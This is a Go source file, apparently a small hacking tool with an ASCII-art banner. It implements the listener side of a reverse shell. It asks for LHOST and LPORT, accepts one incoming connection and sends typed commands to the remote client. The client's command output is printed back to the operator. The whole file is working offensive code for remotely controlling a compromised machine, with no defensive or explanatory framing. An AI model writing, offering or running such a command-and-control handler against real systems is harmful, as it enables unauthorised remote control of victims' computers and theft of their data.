package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

// Function to print banner in blue
func printBanner() {
	// ANSI escape code for blue text
	const blue = "\033[34m"
	const reset = "\033[0m"
	
	// Print the banner in blue using raw string literal (backticks)
	banner := `
  _    __   ___   ___| |_ ___ _ __ ___ _ __ __ _  ___| | __
 | '_ \` _ \ / _ \ __/ _ \ '__/ __| '__/ _\` |/ __| |/ /
 | | | | | |  __/ ||  __/ | | (__| | | (_| | (__|   <
 |_| |_| |_|\___|\__\___|_|  \___|_|  \__,_|\___|_\_\
 `
	fmt.Println(blue + banner + reset)
}

func main() {
	// Print the banner when the server starts
	printBanner()

	// Get LHOST and LPORT from user
	var lhost string
	var lport string

	fmt.Print("ENTER LHOST: ")
	fmt.Scanln(&lhost)
	fmt.Print("ENTER LPORT: ")
	fmt.Scanln(&lport)

	// Listen on the specified LHOST and LPORT
	listenAddr := fmt.Sprintf("%s:%s", lhost, lport)
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer listener.Close()

	fmt.Printf("Listening on %s...\n", listenAddr)

	// Accept incoming connection
	conn, err := listener.Accept()
	if err != nil {
		fmt.Println("Error accepting connection:", err)
		return
	}
	defer conn.Close()

	// Send a welcome message
	conn.Write([]byte("Connected! You can start typing commands.\n"))

	// Interactive loop to send commands to the client
	reader := bufio.NewReader(os.Stdin) // to read commands from server's terminal
	for {
		fmt.Print("shell> ") // Server prompt
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		// If the user types "exit", disconnect the client and exit the server
		if command == "exit" {
			conn.Write([]byte("Exiting... Bye!\n"))
			fmt.Println("Exiting server...")
			return
		}

		// Send command to the client (reverse shell)
		conn.Write([]byte(command + "\n"))

		// Receive the output of the command from the client
		output := make([]byte, 1024)
		n, err := conn.Read(output)
		if err != nil {
			fmt.Println("Error reading from client:", err)
			return
		}

		// Print the command output
		fmt.Printf("Output:\n%s\n", string(output[:n]))
	}
}
